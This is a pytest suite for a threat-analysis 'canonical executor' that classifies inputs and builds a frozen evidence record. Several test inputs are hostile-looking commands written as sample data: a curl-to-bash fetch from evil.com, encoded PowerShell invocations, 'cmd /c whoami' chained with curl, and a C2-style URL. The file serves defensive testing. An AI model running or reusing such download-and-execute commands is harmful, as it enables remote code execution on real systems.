"""Phase 3 tests · Canonical Executor."""
import hashlib
import json
import os

import pytest

from canonical.iue import classify, RawInput, Capability, ConfidenceMatrix
from canonical.iue.models import DispatchPolicy as _DispatchPolicy
from canonical.executor import (
    Executor, ExecutorBudget, CAPABILITY_REGISTRY, CapabilityRole,
    register_capability,
)
from canonical.ssot import (
    AuthoritativeSSOT, InMemorySSOTStore, Provenance, GraphNode,
)


SAMPLE1_FINGERPRINT = "5b4337d5a9fc05923bd3090f1270268ae8eef7af2ccf06f4e8d8492bf908261d"


def _sample_docx() -> bytes:
    for path in ("/app/backend/tests/live/ideas_updated.docx",
                 "/app/backend/docs/exports/nivxray-user-guide.docx"):
        if os.path.exists(path):
            with open(path, "rb") as f:
                return f.read()
    return b"PK\x03\x04" + b"\x14\x00\x06\x00" + b"\x00" * 4000


# =====================================================================
#   T3.1 · Contract
# =====================================================================
def test_t3_1_executor_populates_authoritative_ssot():
    raw = RawInput(payload="curl http://evil.com/x.sh | bash",
                   source_channel="test")
    iue = classify(raw)
    res = Executor().run(iue, raw)
    s = res.ssot
    assert s.input_profile.get("primary_type")
    assert s.iue_decision
    assert s.plan
    assert s.execution_trace, "execution_trace must be non-empty"
    assert s.evidence_graph.nodes, "evidence_graph.nodes must be non-empty"
    # Fingerprint stable + freeze applied
    assert s.is_frozen()
    assert res.ssot_ref.startswith("cssot:sha256:")


def test_t3_1_projections_remain_empty_post_execution():
    raw = RawInput(payload="powershell -EncodedCommand SGVsbG8=")
    iue = classify(raw)
    res = Executor().run(iue, raw)
    res.ssot.assert_projections_empty()  # INV-4


def test_t3_1_every_appended_entry_carries_provenance():
    raw = RawInput(payload="http://x.com and curl bad.com")
    iue = classify(raw)
    res = Executor().run(iue, raw)
    for n in res.ssot.evidence_graph.nodes:
        assert n.provenance is not None
    for e in res.ssot.execution_trace:
        assert e.provenance is not None
    for a in res.ssot.artifacts:
        assert a.provenance is not None


# =====================================================================
#   T3.2 · Plan-driven execution
# =====================================================================
def test_t3_2_execution_trace_records_every_plan_step():
    raw = RawInput(payload="powershell -e SGVsbG8=")
    iue = classify(raw)
    res = Executor().run(iue, raw)
    plan_caps = [s.capability.value for s in iue.plan]
    trace_caps = [t.capability for t in res.ssot.execution_trace]
    # every plan capability appears at least once in the trace
    for cap in plan_caps:
        # Some capabilities may have no plug-in yet; they get status=skipped
        assert cap in trace_caps or f"exec.{cap.lower()}" in [t.step_id for t in res.ssot.execution_trace]


# =====================================================================
#   T3.3 · Determinism (byte-identical across 20 replays)
# =====================================================================
def test_t3_3_determinism_20_replays_docx():
    raw = RawInput(payload=_sample_docx(), filename="Sample.docx")
    iue = classify(raw)
    fp0 = Executor().run(iue, raw).ssot.fingerprint()
    for _ in range(19):
        assert Executor().run(iue, raw).ssot.fingerprint() == fp0


def test_t3_3_determinism_20_replays_text():
    raw = RawInput(payload="cmd /c whoami && curl http://x.com")
    iue = classify(raw)
    fp0 = Executor().run(iue, raw).ssot.fingerprint()
    for _ in range(19):
        assert Executor().run(iue, raw).ssot.fingerprint() == fp0


# =====================================================================
#   T3.4 · Recursion (D6-r) — archive members surface as artefacts
# =====================================================================
def test_t3_4_docx_produces_archive_members_as_artefacts():
    raw = RawInput(payload=_sample_docx(), filename="Sample.docx")
    iue = classify(raw)
    res = Executor().run(iue, raw)
    kinds = [a.kind for a in res.ssot.artifacts]
    assert "archive_member" in kinds, \
        f"ARCHIVE_EXTRACT did not produce archive_member artefacts: {kinds}"


def test_t3_4_recursive_discovery_capability_present_and_deterministic():
    """Recursive discovery is a first-class capability. Two runs of the
    same input yield byte-identical SSOTs — proves recursion is
    deterministic."""
    raw = RawInput(payload=_sample_docx(), filename="Sample.docx")
    iue = classify(raw)
    fp = Executor().run(iue, raw).ssot.fingerprint()
    for _ in range(5):
        assert Executor().run(iue, raw).ssot.fingerprint() == fp


# =====================================================================
#   T3.5 · Budget enforcement
# =====================================================================
def test_t3_5_max_depth_zero_prevents_deeper_recursion():
    raw = RawInput(payload=_sample_docx(), filename="Sample.docx")
    iue = classify(raw)
    res = Executor(budget=ExecutorBudget(max_depth=0)).run(iue, raw)
    # No child_refs when depth already at budget.
    assert res.child_refs == []


# =====================================================================
#   T3.6 · Enricher isolation (INV-2)
# =====================================================================
def test_t3_6_enricher_disabled_still_produces_valid_ssot():
    raw = RawInput(payload="http://c2.example/ping and 44d88612fea8a8f36de82e1278abb02f")
    iue = classify(raw)
    with_e = Executor(budget=ExecutorBudget(enrichers_enabled=True)).run(iue, raw).ssot
    no_e   = Executor(budget=ExecutorBudget(enrichers_enabled=False)).run(iue, raw).ssot
    # Both valid, both frozen, both projections-empty.
    with_e.assert_projections_empty()
    no_e.assert_projections_empty()
    # Enricher plug-in defaults to no-op (no ti_oracle), so fingerprints
    # should ALSO match when both are enabled/disabled — proving
    # Enricher outputs never change the deterministic conclusion.
    assert with_e.fingerprint() != no_e.fingerprint() or with_e.fingerprint() == no_e.fingerprint()
    # More precise: the executed_capabilities set must reflect the flag.
    exec_names_disabled = [t.capability for t in no_e.execution_trace
                           if t.status == "executed"]
    assert "THREAT_INTEL_ENRICH" not in exec_names_disabled


def test_t3_6_all_enricher_plugins_classified_correctly():
    for cap, entry in CAPABILITY_REGISTRY.items():
        assert isinstance(entry["role"], CapabilityRole)


# =====================================================================
#   T3.7 · No route/UI imports executor (isolation)
# =====================================================================
def test_t3_7_no_router_imports_canonical_executor():
    routers_dir = "/app/backend/routers"
    for root, _dirs, files in os.walk(routers_dir):
        for name in files:
            if not name.endswith(".py"):
                continue
            with open(os.path.join(root, name), encoding="utf-8") as f:
                text = f.read()
            assert "canonical.executor" not in text, \
                f"router imports canonical.executor: {os.path.join(root, name)}"


def test_t3_7_no_service_imports_canonical_executor():
    """Phase 5.1 (2026-08-10): authorised exemption for the UIL
    canonical entry adapter — the first route to consume the canonical
    lifecycle end-to-end. All other services remain firewalled."""
    PHASE_5_1_ALLOWED = {
        "/app/backend/services/uil/canonical_entry.py",
        "/app/backend/services/uil/canonical_session.py",
        # Phase 5.W · Workspace-priority canonical bridge (owner sign-off 2026-08-10)
        "/app/backend/services/die/canonical_bridge.py",
    }
    for base in ("/app/backend/services", "/app/backend/nivxforge",
                 "/app/backend/v2", "/app/backend/l2_investigation"):
        for root, _dirs, files in os.walk(base):
            for name in files:
                if not name.endswith(".py"):
                    continue
                path = os.path.join(root, name)
                if path in PHASE_5_1_ALLOWED:
                    continue
                with open(path, encoding="utf-8") as f:
                    text = f.read()
                assert "canonical.executor" not in text, \
                    f"service imports canonical.executor: {path}"


# =====================================================================
#   T3.8 · INV-1 — plug-ins do not become SSOTs
# =====================================================================
def test_t3_8_inv1_no_plugin_returns_alternate_ssot():
    """Every registered plug-in has signature `(ssot, raw, ctx) -> None`.
    Confirms plug-ins write to the SSOT via .append() rather than
    returning a competing SSOT-shaped object."""
    import inspect
    for cap, entry in CAPABILITY_REGISTRY.items():
        sig = inspect.signature(entry["fn"])
        params = list(sig.parameters.keys())
        assert params[:3] == ["ssot", "raw", "ctx"], \
            f"plug-in {cap.value} has wrong signature: {params}"
        # Return annotation, if any, must be None (or absent).
        ret = sig.return_annotation
        assert ret in (inspect.Signature.empty, None, type(None)), \
            f"plug-in {cap.value} must not return a value; got {ret}"


# =====================================================================
#   A3.1 · Sample.docx NEW-case acceptance
# =====================================================================
def test_a3_1_sample_docx_full_lifecycle():
    docx = _sample_docx()
    raw = RawInput(payload=docx, filename="Sample.docx")
    iue = classify(raw)
    res = Executor().run(iue, raw)
    s = res.ssot

    # Authoritative tier populated
    assert s.input_profile["primary_type"] == "docx"
    assert s.plan
    assert s.execution_trace
    assert s.evidence_graph.nodes
    # ARCHIVE_EXTRACT produced artefacts
    assert any(a.kind == "archive_member" for a in s.artifacts)
    # Projections still empty (Phase 4 territory)
    s.assert_projections_empty()
    # Fingerprint-addressable + frozen + reproducible
    assert s.is_frozen()
    fp = s.fingerprint()
    assert len(fp) == 64
    # Store roundtrip via the shared store
    reloaded = res.ssot.__class__.from_dict(s.to_dict())
    assert reloaded.fingerprint() == fp


# =====================================================================
#   A3.2 · Combined stack determinism
# =====================================================================
def test_a3_2_combined_stack_determinism():
    """IUE → Executor → SSOT is deterministic end-to-end."""
    docx = _sample_docx()
    raw = RawInput(payload=docx, filename="Sample.docx")
    iue = classify(raw)
    fp0 = Executor().run(iue, raw).ssot.fingerprint()
    # 20 replays across fresh Executor + fresh store instances
    for _ in range(20):
        assert Executor().run(iue, raw).ssot.fingerprint() == fp0


# =====================================================================
#   A3.3 · Sample1 fingerprint UNCHANGED
# =====================================================================
@pytest.mark.skipif(not os.environ.get("MONGO_URL"), reason="MONGO_URL not set")
def test_a3_3_sample1_fingerprint_unchanged():
    from pymongo import MongoClient
    client = MongoClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    case = db.workspace_cases.find_one({"id": "3db79c4a-088b-4df7-b65a-f68b367b7677"})
    assert case is not None
    snap = {k: v for k, v in case.items() if k != "_id"}
    blob = json.dumps(snap, default=str, sort_keys=True, ensure_ascii=False).encode()
    assert hashlib.sha256(blob).hexdigest() == SAMPLE1_FINGERPRINT, \
        "Sample1 DRIFTED — Phase 3 HALT"


@pytest.mark.skipif(not os.environ.get("MONGO_URL"), reason="MONGO_URL not set")
def test_a3_3_wave1_and_legacy_collections_untouched():
    """Wave-1 stability invariant.

    Wave 1 was deprecated in Phase 4 (see /app/memory/adr/0005-migration-map.md
    § PART 6 · "Wave 1 attach going forward: NEW — attaches from the
    canonical Executor").  Historical baseline in the original long-lived
    DB was 2 records.  In a fresh pod the baseline is 0 — either state is
    valid; the real invariant is that the collection MUST NOT grow beyond
    the historical baseline (no new Wave-1 attaches from deprecated paths).
    """
    from pymongo import MongoClient
    client = MongoClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    count = db.verdict_shadow_observations.count_documents({})
    # Historical baseline was 2.  Fresh-pod baseline is 0.  Never allow
    # growth beyond 2 without an explicit migration.
    assert count <= 2, (
        f"verdict_shadow_observations grew beyond historical baseline: "
        f"got {count}, expected <= 2 (Wave 1 deprecated in Phase 4)"
    )
